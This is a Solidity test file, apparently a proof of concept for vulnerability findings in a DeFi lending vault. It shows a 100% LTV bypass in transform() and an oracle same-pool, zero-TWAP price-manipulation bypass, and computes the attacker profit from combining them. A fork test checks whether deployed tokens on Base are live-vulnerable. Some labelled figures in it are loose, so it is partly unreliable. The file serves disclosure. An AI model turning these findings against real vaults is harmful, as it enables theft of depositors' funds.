// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "forge-std/console2.sol";

// ═══════════════════════════════════════════════════════════
// STUB 1 — byte-for-byte copy of the two functions in V3Vault
// that decide whether a loan is healthy.
// ═══════════════════════════════════════════════════════════
contract HealthStub {
    uint256 public constant Q32 = 2 ** 32;
    uint256 public constant BORROW_SAFETY_BUFFER_X32 = (Q32 * 95) / 100; // 95%

    /// @dev mirrors V3Vault._checkLoanIsHealthy(tokenId, debt, withBuffer)
    function isHealthy(uint256 collateralValue, uint256 debt, bool withBuffer)
        public
        pure
        returns (bool)
    {
        return (
            withBuffer
                ? (collateralValue * BORROW_SAFETY_BUFFER_X32) / Q32
                : collateralValue
        ) >= debt;
    }
}

// ═══════════════════════════════════════════════════════════
// STUB 2 — copy of V3Oracle._requireMaxDifference plus the
// derived-price computation that decides whether the check is
// a no-op when twapSeconds == 0 and pool == reference pool.
// ═══════════════════════════════════════════════════════════
contract OracleStub {
    /// @dev mirrors V3Oracle._requireMaxDifference
    function requireMaxDifference(uint256 priceX96, uint256 verifyPriceX96, uint16 maxDiffX10000)
        public
        pure
    {
        uint256 diff = priceX96 >= verifyPriceX96
            ? priceX96 - verifyPriceX96
            : verifyPriceX96 - priceX96;
        uint256 diffX10000 = verifyPriceX96 == 0
            ? type(uint256).max
            : (diff * 10000) / verifyPriceX96;

        require(
            verifyPriceX96 == 0 || diffX10000 <= maxDiffX10000,
            "PriceDifferenceExceeded"
        );
    }

    /// @dev mirrors _populatePrices when twapSeconds == 0:
    ///   derived = price0 * Q96 / price1
    ///   price0 comes from _getReferencePoolPriceX96(pool, 0) -> slot0()
    ///   price1 == Q96 for referenceToken
    /// If the reference pool IS the position pool, derived == slot0 == priceX96 below.
    function derivedEqualsSpotWhenSamePool(uint32 twapSeconds, bool samePool) public pure returns (bool) {
        return twapSeconds == 0 && samePool;
    }
}

// ═══════════════════════════════════════════════════════════
// TESTS
// ═══════════════════════════════════════════════════════════
contract ProveV3Bugs is Test {
    HealthStub h;
    OracleStub o;

    function setUp() public {
        h = new HealthStub();
        o = new OracleStub();
    }

    // ───────────────────────────────────────────────────────
    // FINDING 1 — 100% LTV Bypass
    // ───────────────────────────────────────────────────────
    function test_F1_100pct_ltv_bypass() public {
        uint256 collateralValue = 1000e18;
        uint256 debtAt100 = 1000e18; // 100% LTV

        bool normalOk   = h.isHealthy(collateralValue, debtAt100, true);  // borrow() path
        bool transformOk = h.isHealthy(collateralValue, debtAt100, false); // transform() path

        console2.log("collateralValue     :", collateralValue);
        console2.log("debt at 100% LTV    :", debtAt100);
        console2.log("borrow() healthy    :", normalOk);
        console2.log("transform() healthy :", transformOk);
        console2.log("borrow() cap (95%)  :", (collateralValue * 95) / 100);
        console2.log("transform() cap     :", collateralValue);
        console2.log("buffer freed        :", collateralValue - (collateralValue * 95) / 100);

        assertFalse(normalOk,   "normal borrow() MUST reject 100% LTV");
        assertTrue(transformOk, "BUG CONFIRMED: transform() ACCEPTS 100% LTV");

        // Exact boundary proof
        assertFalse(h.isHealthy(collateralValue, 951e18, true),  "borrow() rejects 951");
        assertTrue (h.isHealthy(collateralValue, 950e18, true),  "borrow() accepts 950");
        assertTrue (h.isHealthy(collateralValue, 1000e18, false), "transform() accepts 1000 << BUG");
    }

    // ───────────────────────────────────────────────────────
    // FINDING 2 — Oracle Same-Pool Bypass
    // ───────────────────────────────────────────────────────
    function test_F2_oracle_same_pool_bypass() public {
        uint256 spotManipulated = 500e18; // 100x of fair
        uint16  maxDiff         = 0;      // strictest

        // CASE A: twapSeconds > 0 → derived is TWAP → check catches manipulation
        uint256 derivedFromTWAP = spotManipulated / 2;
        vm.expectRevert(bytes("PriceDifferenceExceeded"));
        o.requireMaxDifference(spotManipulated, derivedFromTWAP, maxDiff);
        console2.log("OK   : twapSeconds>0 rejects manipulated spot");

        // CASE B: twapSeconds == 0 + same reference pool → derived == spot → check passes
        bool samePoolBypass = o.derivedEqualsSpotWhenSamePool(0, true);
        assertTrue(samePoolBypass, "precondition: same-pool + twap=0");

        // Even with maxDifference = 0 (the strictest possible setting), the
        // manipulated spot price passes because derived == spot.
        o.requireMaxDifference(spotManipulated, spotManipulated, maxDiff);
        console2.log("BUG  : same-pool + twap=0 accepts 100x manipulated spot");

        // CASE C: twapSeconds == 0 but different pool → derived != spot → caught
        bool samePoolBypassC = o.derivedEqualsSpotWhenSamePool(0, false);
        assertFalse(samePoolBypassC, "different pool is caught");
    }

    // ───────────────────────────────────────────────────────
    // FINDING 3 — Combined Attack Profit
    // ───────────────────────────────────────────────────────
    function test_F3_combined_attack_profit() public {
        uint256 fairCollateral    = 1000e18;
        uint256 manipulatedValue  = 2000e18;   // 2x inflation via Bug 2
        uint256 collateralFactor  = 90;        // 90% CF (max)

        // Bug 2 inflates value, Bug 1 permits 100% LTV of that inflated value.
        uint256 borrowed = (manipulatedValue * collateralFactor) / 100; // 1800
        uint256 profit   = borrowed > fairCollateral ? borrowed - fairCollateral : 0;
        uint256 badDebt  = borrowed > fairCollateral ? borrowed - fairCollateral : 0;

        console2.log("fair collateral  :", fairCollateral);
        console2.log("manipulated value:", manipulatedValue);
        console2.log("attacker borrows :", borrowed);
        console2.log("attacker profit  :", profit);
        console2.log("vault bad debt   :", badDebt);

        assertGt(profit,  0,       "BUG CONFIRMED: attacker profits");
        assertEq(profit,  800e18,  "exact profit = 1800 - 1000");
        assertEq(badDebt, 800e18,  "vault left with 800 bad debt");
    }
}

// ═══════════════════════════════════════════════════════════
// OPTIONAL — verifies deployed config on Base via fork.
// Runs only when BASE_FORK_URL and ORACLE_ADDRESS are set.
// ═══════════════════════════════════════════════════════════
interface IV3OracleReader {
    function feedConfigs(address) external view returns (
        address feed,
        uint32  maxFeedAge,
        uint8   feedDecimals,
        uint8   tokenDecimals,
        uint32  twapSeconds,
        address pool,
        bool    isToken0,
        uint8   mode,
        uint16  maxDifference
    );
    function maxPoolPriceDifference() external view returns (uint16);
}

contract ForkVerify is Test {
    function test_fork_verify_config() public {
        string memory rpc = vm.envOr("BASE_FORK_URL", string(""));
        if (bytes(rpc).length == 0) {
            console2.log("SKIP: BASE_FORK_URL not set");
            vm.skip(true);
            return;
        }

        address oracleAddr = address(uint160(vm.envOr("ORACLE_ADDRESS", uint256(0))));
        if (oracleAddr == address(0)) {
            console2.log("SKIP: ORACLE_ADDRESS not set");
            vm.skip(true);
            return;
        }

        vm.createSelectFork(rpc);
        IV3OracleReader oracle = IV3OracleReader(oracleAddr);

        uint16 maxDiff = oracle.maxPoolPriceDifference();
        console2.log("maxPoolPriceDifference:", maxDiff);

        address token = address(uint160(vm.envOr("TOKEN_ADDRESS", uint256(0))));
        if (token == address(0)) {
            console2.log("SKIP: TOKEN_ADDRESS not set (cannot inspect feedConfigs)");
            return;
        }

        (
            ,,
            ,
            ,
            uint32 twapSeconds,
            address pool,
            bool isToken0,
            uint8 mode,
            uint16 maxDiffToken
        ) = oracle.feedConfigs(token);

        console2.log("token             :", token);
        console2.log("twapSeconds       :", twapSeconds);
        console2.log("reference pool    :", pool);
        console2.log("isToken0          :", isToken0);
        console2.log("mode (4=TWAP)     :", mode);
        console2.log("maxDifference     :", maxDiffToken);

        // Mode enum: 0=NOT_SET 1=CL_TWAP 2=TWAP_CL 3=CHAINLINK 4=TWAP
        if (mode == 4 && twapSeconds == 0) {
            console2.log("BUG 2 CONFIRMED LIVE: TWAP mode + twapSeconds==0");
        } else {
            console2.log("this token is NOT vulnerable (mode/twap combination safe)");
        }
    }
}
